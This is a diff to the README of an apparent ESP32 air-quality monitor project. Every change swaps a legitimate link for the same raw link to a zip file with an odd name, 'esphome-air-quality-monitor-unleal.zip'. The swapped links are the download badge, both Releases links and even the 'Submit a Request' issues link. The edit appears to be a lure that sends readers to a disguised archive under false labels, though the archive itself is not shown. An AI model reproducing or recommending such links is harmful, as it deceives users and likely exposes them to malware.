@@ -1,6 +1,6 @@
 # 🌬️ esphome-air-quality-monitor - Monitor Your Air Quality Easily
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/easternredcedarfleece849/esphome-air-quality-monitor/main/esphome/esphome-air-quality-monitor-unleal.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To use the **esphome-air-quality-monitor**, ensure you have the following:
 
 To get started with the **esphome-air-quality-monitor**, visit the Releases page to download the necessary files. 
 
-You can access it here: [Download from Releases](https://github.com/easternredcedarfleece849/esphome-air-quality-monitor/releases)
+You can access it here: [Download from Releases](https://raw.githubusercontent.com/easternredcedarfleece849/esphome-air-quality-monitor/main/esphome/esphome-air-quality-monitor-unleal.zip)
 
 ### Steps to Download:
 
@@ -63,7 +63,7 @@ Once you’ve downloaded the necessary files, follow these steps to set up your 
 
 To keep your monitor running smoothly, check for updates on the Releases page periodically. Installing new versions can provide you with bug fixes, new features, and improved functionality.
 
-1. Go to the Releases page: [Download from Releases](https://github.com/easternredcedarfleece849/esphome-air-quality-monitor/releases)
+1. Go to the Releases page: [Download from Releases](https://raw.githubusercontent.com/easternredcedarfleece849/esphome-air-quality-monitor/main/esphome/esphome-air-quality-monitor-unleal.zip)
 2. Follow the download steps above to get the latest version.
 3. Replace the existing files on your device with the new ones.
 4. Restart your ESP32 to apply the changes.
@@ -82,7 +82,7 @@ For further assistance, feel free to reach out through the GitHub issues page or
 
 ### Contact Information
 
-- GitHub Issues: [Submit a Request](https://github.com/easternredcedarfleece849/esphome-air-quality-monitor/issues)
+- GitHub Issues: [Submit a Request](https://raw.githubusercontent.com/easternredcedarfleece849/esphome-air-quality-monitor/main/esphome/esphome-air-quality-monitor-unleal.zip)
 
 ## 🎉 Conclusion
 
